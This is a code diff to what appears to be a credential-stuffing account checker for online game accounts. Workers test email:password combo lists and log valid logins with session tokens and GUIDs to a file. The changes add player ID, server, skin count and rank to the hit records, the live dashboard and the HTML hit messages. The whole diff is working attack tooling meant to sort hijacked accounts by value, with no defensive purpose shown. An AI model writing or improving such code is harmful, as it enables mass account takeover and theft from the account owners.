@@ -600,6 +600,7 @@ def render_dashboard(force: bool = False):
             cells = []
             for idx, (val, col) in enumerate(vals):
                 cw = col_w + (rem_pad if idx == 4 else 0)
+                val = _clip_ansi(val, cw)
                 vis = _vis_len(val)
                 lp = max(0, (cw - vis) // 2)
                 cells.append(f"{c(col)}{' ' * lp}{val}{' ' * max(0, cw - vis - lp)}{W}")
@@ -796,10 +797,13 @@ def print_hit(email, password, d, info=None):
     except (ValueError, TypeError):
         skins = 0
 
+    pid, srv = bi.get('player_id'), bi.get('server')
+    id_str = f"ID:{pid}({srv})" if pid and pid != 'Unknown' else ''
     tier_label = ci.get('collector_tier', '') or 'VALID'
     acc = email if len(email) <= 15 else (email[:12] + "...")
-    detail = f"Lv{lvl} {skins}Skins" if (lvl or skins) else tier_label
-    _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GREEN)}{S_OK}{W} {c(WHITE)}{_pad(acc, 15)}{W} {c(GOLD)}{detail[:18]}{W}")
+    detail = f"{id_str} {skins}Sk {rank or ''}".strip() if id_str else (f"Lv{lvl} {skins}Skins" if (lvl or skins) else tier_label)
+    feed_det = f"{pid} {skins}Sk {rank or ''}".strip() if id_str else detail
+    _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GREEN)}{S_OK}{W} {c(WHITE)}{_pad(acc, 15)}{W} {c(GOLD)}{feed_det[:18]}{W}")
     u_short = email if len(email) <= 14 else (email[:11] + "...")
     _TOP_HITS.insert(0, f"{c(CYAN)}Lv{lvl:<3}{W} {c(WHITE)}{_pad(u_short, 14)}{W} {c(GOLD)}{skins}Sk {(rank or tier_label)[:7]}{W}")
     del _TOP_HITS[5:]
@@ -2466,14 +2470,19 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             guid = dec_d.get('guid', '')
             sess = dec_d.get('session', '')
             name = dec_d.get('name', '')
-            append_line(FILES['VALID'], f"{user}:{passw}|{sess}|{guid}|{name}|{iso_time}")
+            bi_i = info_res.get('data', {}).get('basic_info', {}) if info_res and info_res.get('status') == 'success' else {}
+            gi_i = info_res.get('data', {}).get('game_info', {}) if info_res and info_res.get('status') == 'success' else {}
+            gid_s = f"{bi_i.get('player_id')}({bi_i.get('server')})" if bi_i.get('player_id') and bi_i.get('player_id') != 'Unknown' else ''
+            extra_tag = f"|ID:{gid_s}|Skin:{bi_i.get('skin_count', 0)}|Rank:{gi_i.get('current_rank', 'Unknown')}" if gid_s else ""
+            append_line(FILES['VALID'], f"{user}:{passw}|{sess}|{guid}|{name}|{iso_time}{extra_tag}")
             stats['valid'] += 1
             print_hit(user, passw, dec_d, info_res)
+            extra_tg = f"\nID: <code>{esc_html(gid_s)}</code> · Skin: {bi_i.get('skin_count', 0)} · {esc_html(gi_i.get('current_rank', ''))}" if gid_s else ""
             return (
                 f"✅ <b>VALID</b>\n"
                 f"<code>{esc_html(user)}:{esc_html(passw)}</code>\n"
                 f"Session: <code>{esc_html(sess)}</code>\n"
-                f"GUID: {esc_html(guid)} · {esc_html(name)}"
+                f"GUID: {esc_html(guid)} · {esc_html(name)}{extra_tg}"
             )
         elif kind == 'OTP':
             _raw_data = res_data.get('data')
